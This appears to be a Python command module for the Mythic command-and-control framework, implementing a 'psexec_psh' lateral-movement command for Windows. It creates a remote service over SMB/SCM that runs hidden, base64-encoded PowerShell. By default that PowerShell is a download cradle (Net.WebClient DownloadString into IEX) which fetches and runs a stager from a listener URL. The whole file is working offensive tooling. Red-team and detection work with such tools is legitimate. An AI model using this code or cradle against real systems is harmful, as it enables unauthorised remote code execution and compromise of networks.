from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import base64


class PsexecPshArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="host",
                type=ParameterType.String,
                description="Remote host to execute on (SMB/SCM)",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="Listener URL the PowerShell cradle should fetch and run",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description=(
                    "Full PowerShell command to encode and run "
                    "(overrides -url)"
                ),
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception(
                "Require JSON arguments.\n\tUsage: {}".format(
                    PsexecPshCommand.help_cmd
                )
            )


class PsexecPshCommand(CommandBase):
    cmd = "psexec_psh"
    needs_admin = False
    help_cmd = "psexec_psh -host <host> -url <listener url>"
    description = (
        "Lateral movement via SMB/SCM without dropping a binary: creates and "
        "starts a remote service running '%COMSPEC% /b /c powershell -nop -w "
        "hidden -e <b64>'. Supply the stager URL with -url, or a full "
        "PowerShell command with -command. Use make_token first for "
        "alternate credentials."
    )
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1021.002", "T1569.002", "T1059.001"]
    argument_class = PsexecPshArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        url = taskData.args.get_arg("url")
        command = taskData.args.get_arg("command")
        if command:
            ps_command = command
        elif url:
            ps_command = (
                "$c=New-Object Net.WebClient;"
                f"IEX($c.DownloadString('{url}'))"
            )
        else:
            response.Success = False
            response.Error = "Either -url or -command must be provided"
            return response

        # powershell -e expects base64 of UTF-16LE
        enc = base64.b64encode(ps_command.encode("utf-16-le")).decode()
        taskData.args.add_arg("enc_cmd", enc, ParameterType.String)
        target = command if command else url
        response.DisplayParams = f"Targeting {taskData.args.get_arg('host')} via {target}"
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID, Success=True
        )
